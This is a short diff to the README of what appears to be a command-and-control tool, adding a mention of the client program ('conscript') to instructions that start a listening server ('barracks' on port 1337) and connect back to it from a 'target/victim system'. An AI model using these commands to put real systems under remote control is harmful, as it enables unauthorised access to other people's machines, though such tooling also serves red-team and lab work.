@@ -12,7 +12,7 @@ Start command and control server (barracks)
 barracks 1337
 ```
 
-Now connect from the target/victim system, specifying the hostname/ip of the barracks, and port that the barracks is listening on (1337 in our example)
+Now connect from the target/victim system using the client (conscript), specifying the hostname/ip of the barracks, and port that the barracks is listening on (1337 in our example)
 ```bash
 conscript <ip/hostname of barracks> <port of barracks>
 ```
